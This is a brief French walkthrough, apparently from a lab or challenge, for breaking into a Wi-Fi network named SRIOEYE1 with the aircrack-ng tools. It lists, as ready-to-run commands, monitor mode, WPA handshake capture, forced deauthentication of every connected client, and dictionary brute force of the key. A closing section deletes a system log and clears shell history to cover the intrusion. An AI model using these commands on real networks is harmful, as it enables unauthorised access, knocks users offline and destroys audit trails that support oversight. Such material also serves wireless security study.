# Explication 

## 1 - Handshake + bruteforce

### Récupérer handshake :

#### Passage en mode monitor : 

```bash
airmon-ng start wlan0
```
#### Écoute du trafic alentour : => récupère le BSSID et le channel de SRIOEYE1

```bash
airodump-ng wlan0mon 
```

#### Ecoute sur channel : 

```bash 
iwconfig wlan0mon channel <num_channel>
```
#### Capture pour récupérer le handshake : 

```bash 
airodump-ng –bssid <bssid> -c <num_channel> -w log wlan0mon
```

#### Forcer la déconnexion de tout le monde : 

```bash
aireplay-ng -0 0 -a <bssid> wlan0mon
```

### Brute Force :

```bash
aircrack-ng log-01.cap -w dico.txt
```

## 2 - Supprimer ses traces

```bash 
rm /var/sys/syslog 
```
ou alors 

```bash
history -c
```
